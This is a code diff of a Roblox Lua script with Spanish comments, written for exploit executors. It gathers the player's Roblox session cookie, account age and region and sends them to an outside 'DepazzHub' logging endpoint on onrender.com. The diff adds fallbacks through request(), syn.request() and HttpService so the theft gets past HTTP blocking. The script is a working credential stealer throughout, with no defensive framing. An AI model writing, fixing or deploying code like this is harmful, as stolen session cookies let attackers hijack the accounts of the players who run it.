@@ -2,16 +2,15 @@
 -- SCRIPT UNIVERSAL DE WEBHOOK (Todo en uno, sin dependencias externas)
 -- =====================================================================
 
-local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalizationService = game:GetService("LocalizationService")
 
 local player = Players.LocalPlayer
 local placeId = game.PlaceId
 
--- 1. FUNCIÓN UNIVERSAL DE COOKIES (Funciona en Delta, Hydrogen, Fluxus, Arceus X, etc.)
+-- 1. FUNCIÓN UNIVERSAL DE COOKIES
 local function GetUniversalCookie()
-    -- Método A: Función nativa getcookie() (La más compatible en executores modernos)
+    -- Método A: Función nativa getcookie() (La más compatible)
     if type(getcookie) == "function" then
         local success, cookie = pcall(getcookie)
         if success and cookie and tostring(cookie) ~= "" then
@@ -28,7 +27,7 @@ local function GetUniversalCookie()
         end
     end
 
-    -- Método C: CookieService (Último recurso, solo funciona en algunos executors de PC)
+    -- Método C: CookieService (Último recurso)
     local success, CookieService = pcall(function() 
         return game:GetService("CookieService") 
     end)
@@ -65,18 +64,57 @@ local data = {
     gameId = placeId,
     accountAge = GetAccountAge(),
     region = GetRegion(),
-    cookie = GetUniversalCookie() -- Aquí se inyecta la cookie universal
+    cookie = GetUniversalCookie()
 }
 
--- 4. ENVÍO DEL WEBHOOK
+-- 4. FUNCIÓN UNIVERSAL PARA ENVIAR HTTP (EVITA EL ERROR DE BLOQUEO)
+local function SendWebhook(url, data)
+    local jsonData = game:GetService("HttpService"):JSONEncode(data)
+    
+    -- Intentar con request() (Funciona en 95% de executores modernos)
+    if type(request) == "function" then
+        local success, result = pcall(request, {
+            Url = url,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = jsonData
+        })
+        return success, result
+    end
+    
+    -- Fallback a syn.request() (Para executores más antiguos)
+    if type(syn) == "table" and type(syn.request) == "function" then
+        local success, result = pcall(syn.request, {
+            Url = url,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = jsonData
+        })
+        return success, result
+    end
+    
+    -- Último recurso: HttpService (Solo si no está bloqueado)
+    local success, result = pcall(function()
+        return game:GetService("HttpService"):PostAsync(url, jsonData)
+    end)
+    return success, result
+end
+
+-- 5. ENVÍO DEL WEBHOOK
 local webhookUrl = "https://depazzhub-api.onrender.com/log"
 
-local success, response = pcall(function()
-    return HttpService:PostAsync(webhookUrl, HttpService:JSONEncode(data))
-end)
+local success, response = SendWebhook(webhookUrl, data)
 
 if success then
     print("✅ Webhook enviado correctamente a DepazzHub!")
+    -- Imprimir detalles si están disponibles
+    if response then
+        print("📊 Status:", response.StatusCode or response.status or "200")
+    end
 else
     warn("❌ Error al enviar el webhook:", response)
 end
